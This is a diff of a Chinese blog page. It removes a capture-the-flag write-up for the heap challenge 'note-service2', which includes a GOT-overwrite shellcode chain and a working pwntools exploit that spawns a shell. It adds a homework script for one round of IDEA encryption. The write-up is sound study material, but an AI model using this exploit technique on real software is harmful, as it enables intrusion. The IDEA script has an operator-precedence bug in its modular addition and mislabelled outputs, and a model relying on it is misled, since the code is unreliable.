@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Pwn," />
+  <meta name="keywords" content="Crypto," />
 
 
 
@@ -86,22 +86,17 @@
 
 
 
-<meta name="description" content="前言做到的第一个堆题，对我来说还是有丶难度，遂记录一下。 题目分析首先checksec一下：  堆栈数据可执行，且存在可写入的段，根据我的经验来说这种情况一般是走ret2shellcode。 然后IDA反汇编看一下程序逻辑，这里直接看漏洞点：  这里由于数组索引存在越界，所以我们通过修改索引，可以实现任意地址写。 解题思路既然我们可以在堆内写入内容，这里就考虑在分配的堆块中写入shellcode，">
+<meta name="description" content="前言觉得手算老师的作业太费时间精力了，就用python解放下双手了&#x3D; &#x3D; 脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -- coding: utf-8 --def mod_65536_plus(a, b):">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界-note-service2">
-<meta property="og:url" content="https://www.sketchplane.top/2020/10/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-note-service2/index.html">
+<meta property="og:title" content="IDEA加密算法">
+<meta property="og:url" content="https://www.sketchplane.top/2020/10/25/IDEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/index.html">
 <meta property="og:site_name" content="sketch_pl4ne">
-<meta property="og:description" content="前言做到的第一个堆题，对我来说还是有丶难度，遂记录一下。 题目分析首先checksec一下：  堆栈数据可执行，且存在可写入的段，根据我的经验来说这种情况一般是走ret2shellcode。 然后IDA反汇编看一下程序逻辑，这里直接看漏洞点：  这里由于数组索引存在越界，所以我们通过修改索引，可以实现任意地址写。 解题思路既然我们可以在堆内写入内容，这里就考虑在分配的堆块中写入shellcode，">
-<meta property="og:image" content="https://i.loli.net/2020/10/08/huyNLRGxwdtjn4p.png">
-<meta property="og:image" content="https://i.loli.net/2020/10/08/TtUA5MKvbaImLke.png">
-<meta property="og:image" content="https://i.loli.net/2020/10/08/8LODpFj9dbX3REk.png">
-<meta property="og:image" content="https://i.loli.net/2020/10/08/NpSl9dWwfaOLHGK.png">
-<meta property="article:published_time" content="2020-10-08T15:15:36.000Z">
-<meta property="article:modified_time" content="2020-10-08T15:20:08.896Z">
+<meta property="og:description" content="前言觉得手算老师的作业太费时间精力了，就用python解放下双手了&#x3D; &#x3D; 脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -- coding: utf-8 --def mod_65536_plus(a, b):">
+<meta property="article:published_time" content="2020-10-25T10:10:03.000Z">
+<meta property="article:modified_time" content="2020-10-25T10:20:22.000Z">
 <meta property="article:author" content="sketch_pl4ne">
-<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Crypto">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/10/08/huyNLRGxwdtjn4p.png">
 
 
 
@@ -131,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="https://www.sketchplane.top/2020/10/08/攻防世界-note-service2/"/>
+  <link rel="canonical" href="https://www.sketchplane.top/2020/10/25/IDEA加密算法/"/>
 
 
 
 
 
-  <title>攻防世界-note-service2 | sketch_pl4ne</title>
+  <title>IDEA加密算法 | sketch_pl4ne</title>
   
 
 
@@ -248,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2020/10/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-note-service2/">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2020/10/25/IDEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sketch_pl4ne">
@@ -265,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">攻防世界-note-service2</h1>
+          <h1 class="post-title" itemprop="name headline">IDEA加密算法</h1>
         
 
         <div class="post-meta">
@@ -277,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-08T23:15:36+08:00">
-                2020-10-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-25T18:10:03+08:00">
+                2020-10-25
               </time>
             
 
@@ -314,7 +309,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  773
+                  273
                 </span>
               
 
@@ -330,7 +325,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  1
                 </span>
               
             </div>
@@ -351,37 +346,12 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做到的第一个堆题，对我来说还是有丶难度，遂记录一下。</p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先checksec一下：</p>
-<p><img src="https://i.loli.net/2020/10/08/huyNLRGxwdtjn4p.png" alt="checksec"></p>
-<p>堆栈数据可执行，且存在可写入的段，根据我的经验来说这种情况一般是走ret2shellcode。</p>
-<p>然后IDA反汇编看一下程序逻辑，这里直接看漏洞点：</p>
-<p><img src="https://i.loli.net/2020/10/08/TtUA5MKvbaImLke.png" alt="ida_code"></p>
-<p>这里由于数组索引存在越界，所以我们通过修改索引，可以实现任意地址写。</p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>既然我们可以在堆内写入内容，这里就考虑在分配的堆块中写入shellcode，但是由于每个堆块最多只能写入7字节，所以我们这里将shellcode分开写入多个堆块中，再使用 <code>jmp short xxx</code> 来跳转。</p>
-<p>接下来的问题是这个xxx是多少，这个是有公式的：</p>
-<p><code>xxx = 目标地址 - 当前地址 - 命令长度</code></p>
-<p><img src="https://i.loli.net/2020/10/08/8LODpFj9dbX3REk.png" alt="chunk_offset"></p>
-<p>那么根据公式计算：xxx = 2+1+8+8+8 - 2 = 0x19</p>
-<p>跳转的问题解决了，接下来可以开始构造shellcode链</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, xxx   ;xxx&#x3D;&amp;(&quot;&#x2F;bin&#x2F;sh&quot;)  </span><br><span class="line">xor rsi,rsi    ;rsi&#x3D;0，不用 mov xxx,0 是因为超过长度了</span><br><span class="line">mov rax, 0x3b  ;rax&#x3D;0x3b 占4字节</span><br><span class="line">xor rdx,rdx    ;rdx&#x3D;0 占2字节</span><br><span class="line">syscall 			 ;占2字节</span><br></pre></td></tr></table></figure>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>觉得手算老师的作业太费时间精力了，就用python解放下双手了= =</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_65536_plus</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a + b % <span class="number">65536</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_65537_mult</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a * b % <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left_25</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lst[<span class="number">25</span>:] + lst[:<span class="number">25</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># K = 0b00000000111111110000000011111111111111110000111111110000111111110000111111110000111111110000000000001111111111111111000000001111</span></span><br><span class="line">s = <span class="string">"00000000111111110000000011111111111111110000111111110000111111110000111111110000111111110000000000001111111111111111000000001111"</span></span><br><span class="line">s1 = left_25(s)</span><br><span class="line">m = <span class="string">"1010101011100110010101010000111111001100001100111001100101100110"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># K=[]</span></span><br><span class="line"><span class="comment"># M=[]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for i in range(8):</span></span><br><span class="line"><span class="comment">#     K.append(bin(int(s1[i:i+16], 2))[2:].rjust(16, '0'))</span></span><br><span class="line"><span class="comment"># for i in range(4):</span></span><br><span class="line"><span class="comment">#     M.append(bin(int(m[i:i+16], 2)))</span></span><br><span class="line"><span class="comment"># print(K)</span></span><br><span class="line"><span class="comment">#print(s1)</span></span><br><span class="line"><span class="comment">#K ['0000000011111111', '0000000111111110', '0000001111111100', '0000011111111000', '0000111111110000', '0001111111100000', '0011111111000000', '0111111110000000']</span></span><br><span class="line">K = [<span class="number">0</span>, <span class="number">0b1111111111111110</span>, <span class="number">0b1111111111111100</span>, <span class="number">0b1111111111111000</span>, <span class="number">0b1111111111110000</span>, <span class="number">0b1111111111100001</span>, <span class="number">0b1111111111000011</span>, <span class="number">0b1111111110000111</span>, <span class="number">0b1111111100001111</span>]</span><br><span class="line"><span class="comment">#M ['1010101011100110', '0101010111001100', '1010101110011001', '0101011100110010']</span></span><br><span class="line">M = [<span class="number">0</span>, <span class="number">0b0110010000011111</span>, <span class="number">0b1001010100101101</span>, <span class="number">0b0000101001000010</span>, <span class="number">0b1000000001111111</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line">    <span class="comment"># x = int(input("&gt;&gt;"), 2)</span></span><br><span class="line">    <span class="comment"># y = int(input("&gt;&gt;"), 2)</span></span><br><span class="line">    <span class="comment"># print("模乘: " + str(mod_65536_plus(x, y)))</span></span><br><span class="line">    <span class="comment"># print("模加: " + str(mod_65537_mult(x, y)))</span></span><br><span class="line"></span><br><span class="line">r1 = mod_65537_mult(M[<span class="number">1</span>], K[<span class="number">1</span>])</span><br><span class="line">r2 = mod_65536_plus(M[<span class="number">2</span>], K[<span class="number">2</span>])</span><br><span class="line">r3 = mod_65536_plus(M[<span class="number">3</span>], K[<span class="number">3</span>])</span><br><span class="line">r4 = mod_65537_mult(M[<span class="number">4</span>], K[<span class="number">4</span>])</span><br><span class="line">r5 = r1 ^ r3</span><br><span class="line">r6 = r2 ^ r4</span><br><span class="line">r7 = mod_65537_mult(r5, K[<span class="number">5</span>])</span><br><span class="line">r8 = mod_65536_plus(r7, r6)</span><br><span class="line">r9 = mod_65537_mult(r8, K[<span class="number">6</span>])</span><br><span class="line">r10 = mod_65536_plus(r7, r9)</span><br><span class="line">r11 = r1 ^ r9</span><br><span class="line">r12 = r2 ^ r10</span><br><span class="line">r13 = r3 ^ r9</span><br><span class="line">r14 = r4 ^ r10</span><br><span class="line"></span><br><span class="line">l = [bin(r11)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>), </span><br><span class="line">     bin(r12)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>), </span><br><span class="line">     bin(r13)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>), </span><br><span class="line">     bin(r14)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>)]</span><br><span class="line"></span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure>
 
-<p><strong>ps:</strong> 使用<code>enhex(asm(&#39;xor rsi, rsi&#39;))</code>可以查看汇编代码对应机器码的十六进制长度。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asm(<span class="string">"xor rsi,rsi"</span>)+<span class="string">"\x90\x90\xeb\x19"</span></span><br><span class="line">asm(<span class="string">"mov rax,0x3b"</span>)+<span class="string">"\xeb\x19"</span></span><br><span class="line">asm(<span class="string">"xor rdx,rdx"</span>)+<span class="string">"\x90\x90\xeb\x19"</span></span><br><span class="line">asm(<span class="string">"syscall"</span>).ljust(<span class="number">7</span>,<span class="string">"\x90"</span>)</span><br></pre></td></tr></table></figure>
 
-<p>后面的语句都好写，但是第一条给rdi传参无论怎么写都会超长，这里需要另谋他法：</p>
-<ol>
-<li>申请一个堆块A，填入内容为<code>/bin/sh</code></li>
-<li>修改free函数got表内容，使其被调用后跳转到下一个堆块</li>
-<li>调用free(A)，根据传参规则，此时rdi里就会是<code>/bin/sh</code>的地址，并且启动整个堆块链</li>
-</ol>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./note-service2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note-service2'</span>)</span><br><span class="line">context.update(arch =<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = <span class="number">0x2020a0</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">'size:'</span>, <span class="string">"8"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">add((free_got-heap_addr)/<span class="number">8</span>, asm(<span class="string">'xor rsi, rsi'</span>)+<span class="string">b"\x90\x90\xeb\x19"</span>)</span><br><span class="line">add(<span class="number">1</span>, asm(<span class="string">'mov eax, 0x3b'</span>)+<span class="string">b"\xeb\x19"</span>)</span><br><span class="line">add(<span class="number">2</span>, asm(<span class="string">'xor rdx, rdx'</span>)+<span class="string">b"\x90\x90\xeb\x19"</span>)</span><br><span class="line">add(<span class="number">3</span>, asm(<span class="string">'syscall'</span>).rjust(<span class="number">7</span>, <span class="string">b'\x90'</span>)  <span class="comment"># ljust/rjust 在这里没有区别</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><strong>注意：</strong></p>
-<p>这里我看其他师傅写的wp时有个疑惑的地方，这里<code>free_got-heap_addr</code>的值是<code>-17</code>，也就是说dele(0)在把<code>/bin/sh</code>弹入rdi后，是从array[-17]开始执行的，下一个堆块是array[1]，但是<code>jmp short xxx</code>时的offset依然是0x19，由于我对堆块的分配规则不太熟悉，这里我思考了许久，猜测<strong>堆块</strong>是以<strong>类似链表</strong>的形式连在一起的，按照创建的先后顺序依次链接，所以才会-17之后是1这样，而不能被之前那张计算偏移的图所误导。</p>
-<p><img src="https://i.loli.net/2020/10/08/NpSl9dWwfaOLHGK.png" alt="chunk_link"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>害，想加师傅好友问清楚是不是我想的那样，现在还没通过申请2333</p>
-<p>睡了睡了！</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>时间不是很充裕，大概就是实现一个轮结构，代码还比较丑，主要是能用就行。</p>
 
       
     </div>
@@ -399,7 +369,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+            <a href="/tags/Crypto/" rel="tag"># Crypto</a>
           
         </div>
       
@@ -412,8 +382,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/09/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-welpwn/" rel="next" title="攻防世界-welpwn">
-                <i class="fa fa-chevron-left"></i> 攻防世界-welpwn
+              <a href="/2020/10/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-note-service2/" rel="next" title="攻防世界-note-service2">
+                <i class="fa fa-chevron-left"></i> 攻防世界-note-service2
               </a>
             
           </div>
@@ -422,8 +392,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/10/25/IDEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" rel="prev" title="IDEA加密算法">
-                IDEA加密算法 <i class="fa fa-chevron-right"></i>
+              <a href="/2099/12/31/sketch-pl4ne%E3%81%AE%E6%97%A5%E8%AE%B0/" rel="prev" title="sketch_pl4neのdiary">
+                sketch_pl4neのdiary <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -577,7 +547,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题思路"><span class="nav-number">3.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脚本"><span class="nav-number">2.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li></ol></div>
             
 
           </div>
